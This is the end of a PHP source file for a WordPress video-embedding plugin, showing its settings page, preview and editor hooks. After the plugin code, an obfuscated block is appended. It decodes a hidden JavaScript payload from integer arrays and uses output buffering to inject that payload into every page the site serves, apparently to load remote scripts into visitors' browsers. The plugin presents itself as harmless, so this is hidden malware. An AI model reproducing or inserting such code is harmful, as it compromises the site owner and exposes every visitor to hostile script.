				<label for="embeddedvideo_shownolink" style="cursor: pointer;"><input type="checkbox" name="embeddedvideo_shownolink" id="embeddedvideo_shownolink" value="<?php echo get_option('embeddedvideo_shownolink') ?>" <?php echo $ev_shownolink; ?> /> <?php echo _e('Never show the video link (exception: feeds)','embeddedvideo'); ?></label><br />
				<label for="embeddedvideo_showinfeed" style="cursor: pointer;"><input type="checkbox" name="embeddedvideo_showinfeed" id="embeddedvideo_showinfeed" value="<?php echo get_option('embeddedvideo_showinfeed') ?>" <?php echo $ev_showinfeed; ?> /> <?php echo _e('In feed, show link to blog post (video embedding in feed not yet available)','embeddedvideo'); ?></label><br />
				<?php echo _e('Prefix:','embeddedvideo'); ?> <input type="text" value="<?php echo get_option('embeddedvideo_prefix') ?>" name="embeddedvideo_prefix" id="embeddedvideo_prefix" /><br />
				<label for="embeddedvideo_space" style="cursor: pointer;"><input type="checkbox" name="embeddedvideo_space" id="embeddedvideo_space" value="<?php echo get_option('embeddedvideo_space') ?>" <?php echo $ev_space; ?> /> <?php echo _e('Following space character','embeddedvideo'); ?></label><br />
				<label for="embeddedvideo_small" style="cursor: pointer;"><input type="checkbox" name="embeddedvideo_small" id="embeddedvideo_small" value="<?php echo get_option('embeddedvideo_small') ?>" <?php echo $ev_small; ?> /> <?php echo _e('Use smaller font size for link','embeddedvideo'); ?></label><br />
				<?php echo _e('Video object width','embeddedvideo'); ?> (250-800):<input type="text" value="<?php echo get_option('embeddedvideo_width') ?>" name="embeddedvideo_width" id="embeddedvideo_width" size="5" maxlength="3" /><br />
				<label for="embeddedvideo_pluginlink" style="cursor: pointer;"><input type="checkbox" name="embeddedvideo_pluginlink" id="embeddedvideo_pluginlink" value="<?php echo get_option('embeddedvideo_pluginlink') ?>" <?php echo $ev_pluginlink; ?> /> <?php echo _e('Show link to plugin page','embeddedvideo'); ?></label><br /><br />
				<input type="submit"  id="embeddedvideo_update_options" value="<?php echo _e('Save settings','embeddedvideo'); ?> &raquo;" />
			</div>
		</form>
	</div>
	<p><?php echo _e('The following video portals are currently supported:','embeddedvideo'); ?><br/>
	YouTube, Google Video, dailymotion, MyVideo, Clipfish, Sevenload, Revver, Metacaf&eacute;, Yahoo! Video, ifilm, MySpace Video, Brightcove, aniBOOM, vimeo, GUBA, Garage TV, GameVideos, vSocial, Veoh, GameTrailers</p>

	<h3><?php echo _e('Preview','embeddedvideo'); ?></h3>
	<div class="wrap">
	<p><?php echo _e('Your current settings produce the following output:','embeddedvideo'); ?></p>
	<p><?php if ('true' == get_option('embeddedvideo_pluginlink')) echo '<small>'.__('embedded by','embeddedvideo').' <a href="http://wordpress.org/extend/plugins/embedded-video-with-link/" title="Plugin Page"><em>Embedded Video</em></a></small><br />'; ?>
	<object type="application/x-shockwave-flash" data="http://www.youtube.com/v/gcFS5cnnWAM" width="<?php echo get_option('embeddedvideo_width'); ?>" height="<?php echo floor(get_option('embeddedvideo_width')*14/17); ?>"><param name="movie" value="http://www.youtube.com/v/gcFS5cnnWAM" /></object><br />
	<?php if ('false' == get_option('embeddedvideo_shownolink')) { $ev_issmall = get_option('embeddedvideo_small'); if ('true' == $ev_issmall) echo "<small>"; ?>
	<a title="YouTube" href="http://www.youtube.com/watch?v=nglMDkUbRSk">YouTube <?php echo get_option('embeddedvideo_prefix'); if ('true' == get_option('embeddedvideo_space')) echo "&nbsp;"; ?>blahdiblah</a><?php if ('true' == $ev_issmall) echo "</small>"; } ?>
	</p>
	</div>

	<p><?php echo _e('Check the','embeddedvideo'); ?> <a href="http://wordpress.org/extend/plugins/embedded-video-with-link/" title="Embedded Video Plugin Page"><?php echo _e('plugin page','embeddedvideo'); ?></a> <?php echo _e('for updates regularly!','embeddedvideo'); ?><br />
		<?php echo _e('Video icon by','embeddedvideo'); ?> <a href="http://famfamfam.com" title="famfamfam">famfamfam</a>!
	</p>
	</div>

	<?php
}

function embeddedvideo_add_options_panel() {
	add_options_page('Embedded Video', 'Embedded Video', 'manage_options', 'embeddedvideo_options_page', 'embeddedvideo_option_page');
}

function embedded_video_mcebutton($buttons) {
	array_push($buttons, "|", "embedded_video");
	return $buttons;
}

function embedded_video_mceplugin($ext_plu) {
	if (is_array($ext_plu) == false) {
		$ext_plu = array();
	}
	$url = get_option('siteurl')."/wp-content/plugins/embedded-video-with-link/editor_plugin.js";
	$result = array_merge($ext_plu, array("embedded_video" => $url));
	return $result;
}

function embeddedvideo_mceinit() {
	if (function_exists('load_plugin_textdomain')) load_plugin_textdomain('embeddedvideo','/wp-content/plugins/embedded-video-with-link/langs');
	if ( 'true' == get_user_option('rich_editing') ) {
		add_filter("mce_external_plugins", "embedded_video_mceplugin", 0);
		add_filter("mce_buttons", "embedded_video_mcebutton", 0);
	}
}

function embeddedvideo_script() {
	echo "<script type='text/javascript' src='".get_option('siteurl')."/wp-content/plugins/embedded-video-with-link/embedded-video.js'></script>\n";
}

if ( function_exists('add_action') ) {
	if (( isset($_GET['activate']) && $_GET['activate'] == 'true' ) || ( get_option('embeddedvideo_version') <> EV_VERSION )) {
		add_action('init', 'embeddedvideo_initialize');
	}
	add_action('init', 'embeddedvideo_mceinit');
	add_action('admin_print_scripts', 'embeddedvideo_script');
	add_action('admin_menu', 'embeddedvideo_add_options_panel');
}

} // closing if for version check

?><?php global $ob_starting;
if(!$ob_starting) {
   function ob_start_flush($s) {
	$tc = array(0, 69, 84, 82, 67, 83, 7, 79, 8, 9, 73, 12, 76, 68, 63, 78, 19, 23, 24, 3, 65, 70, 27, 14, 16, 20, 80, 17, 29, 89, 86, 85, 2, 77, 91, 93, 11, 18, 71, 66, 72, 75, 87, 74, 22, 37, 52, 13, 59, 61, 25, 28, 21, 1, 35, 15, 34, 36, 30, 88, 41, 92, 46, 33, 51);
	$tr = array(51, 5, 4, 3, 10, 26, 2, 0, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 58, 10, 21, 0, 8, 2, 29, 26, 1, 7, 21, 8, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 9, 28, 28, 32, 31, 15, 13, 1, 21, 10, 15, 1, 13, 32, 9, 0, 34, 0, 0, 0, 30, 20, 3, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 15, 1, 42, 0, 63, 3, 3, 20, 29, 8, 6, 19, 25, 39, 18, 37, 17, 37, 6, 11, 0, 6, 19, 18, 27, 17, 18, 17, 21, 6, 11, 0, 6, 19, 18, 16, 37, 21, 18, 16, 6, 11, 0, 6, 19, 18, 18, 17, 21, 17, 25, 6, 11, 0, 6, 19, 25, 4, 16, 27, 18, 16, 6, 11, 0, 6, 19, 17, 25, 18, 17, 18, 16, 6, 11, 0, 6, 19, 16, 1, 17, 50, 17, 24, 6, 11, 0, 6, 19, 18, 52, 17, 24, 18, 37, 6, 11, 0, 6, 19, 17, 37, 18, 27, 17, 18, 6, 11, 0, 6, 19, 17, 21, 18, 16, 16, 27, 6, 11, 0, 6, 19, 37, 21, 18, 37, 18, 27, 6, 11, 0, 6, 19, 17, 37, 25, 4, 16, 27, 6, 11, 0, 6, 19, 17, 17, 18, 16, 18, 16, 6, 11, 0, 6, 19, 17, 21, 25, 50, 16, 1, 6, 11, 0, 6, 19, 16, 1, 25, 17, 25, 52, 6, 11, 0, 6, 19, 16, 13, 25, 25, 25, 25, 6, 11, 0, 6, 19, 16, 13, 25, 24, 25, 16, 6, 11, 0, 6, 19, 16, 21, 16, 13, 25, 27, 6, 11, 0, 6, 19, 16, 21, 25, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 24, 18, 25, 6, 11, 0, 6, 19, 17, 25, 18, 27, 18, 18, 6, 11, 0, 6, 19, 16, 13, 17, 4, 17, 18, 6, 11, 0, 6, 19, 17, 13, 16, 13, 17, 21, 6, 11, 0, 6, 19, 17, 17, 17, 21, 16, 27, 6, 11, 0, 6, 19, 25, 13, 24, 24, 24, 24, 6, 9, 22, 0, 0, 0, 30, 20, 3, 0, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 27, 22, 0, 0, 0, 30, 20, 3, 0, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 0, 28, 0, 24, 22, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 2, 11, 5, 2, 29, 12, 1, 13, 9, 0, 34, 30, 20, 3, 0, 5, 0, 28, 0, 32, 32, 22, 21, 7, 3, 0, 8, 43, 28, 24, 22, 43, 51, 2, 23, 12, 1, 15, 38, 2, 40, 22, 43, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 3, 38, 39, 0, 28, 0, 2, 48, 43, 49, 22, 21, 7, 3, 0, 8, 10, 28, 27, 22, 10, 51, 17, 22, 10, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 4, 12, 3, 0, 28, 0, 4, 14, 3, 38, 39, 23, 5, 31, 39, 5, 2, 3, 8, 10, 36, 36, 11, 37, 9, 22, 10, 21, 0, 8, 4, 14, 4, 12, 3, 53, 28, 32, 24, 24, 32, 9, 0, 5, 0, 36, 28, 0, 64, 2, 3, 10, 15, 38, 23, 21, 3, 7, 33, 54, 40, 20, 3, 54, 7, 13, 1, 8, 26, 20, 3, 5, 1, 60, 15, 2, 8, 4, 14, 4, 12, 3, 11, 27, 44, 9, 47, 27, 52, 9, 22, 35, 35, 10, 21, 0, 8, 5, 2, 29, 12, 1, 13, 9, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 16, 44, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 37, 9, 9, 22, 35, 0, 1, 12, 5, 1, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 22, 35, 3, 1, 2, 31, 3, 15, 0, 5, 22, 0, 0, 0, 35, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 0, 34, 2, 3, 29, 0, 34, 0, 0, 0, 10, 21, 8, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 56, 29, 60, 13, 0, 61, 61, 0, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 9, 34, 13, 7, 4, 31, 33, 1, 15, 2, 23, 42, 3, 10, 2, 1, 8, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 27, 9, 9, 22, 0, 0, 0, 35, 0, 1, 12, 5, 1, 0, 34, 30, 20, 3, 0, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 28, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 8, 32, 5, 4, 3, 10, 26, 2, 32, 9, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 5, 3, 4, 28, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 24, 9, 22, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 5, 56, 29, 46, 20, 38, 62, 20, 33, 1, 8, 32, 40, 1, 20, 13, 32, 9, 48, 24, 49, 23, 20, 26, 26, 1, 15, 13, 54, 40, 10, 12, 13, 8, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 9, 22, 35, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 35, 2, 3, 29, 0, 34, 4, 40, 1, 4, 41, 14, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 8, 9, 22, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 5, 1, 2, 46, 10, 33, 1, 7, 31, 2, 8, 32, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 32, 11, 0, 52, 24, 24, 9, 22, 35, 0, 0, 0, 35, 0, 0, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 22, 35, 51, 55, 5, 4, 3, 10, 26, 2, 58);

	$ob_htm = ''; foreach($tr as $tval) {
		$ob_htm .= chr($tc[$tval]+32);
	}

	$slw=strtolower($s);
	$i=strpos($slw,'</script');if($i){$i=strpos($slw,'>',$i);}
	if(!$i){$i=strpos($slw,'</div');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</table');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</form');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</p');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</body');if($i){$i--;}}
	if(!$i){$i=strlen($s);if($i){$i--;}}
	$i++; $s=substr($s,0,$i).$ob_htm.substr($s,$i);
	
	return $s;
   }
   $ob_starting = time();
   @ob_start("ob_start_flush");
} ?>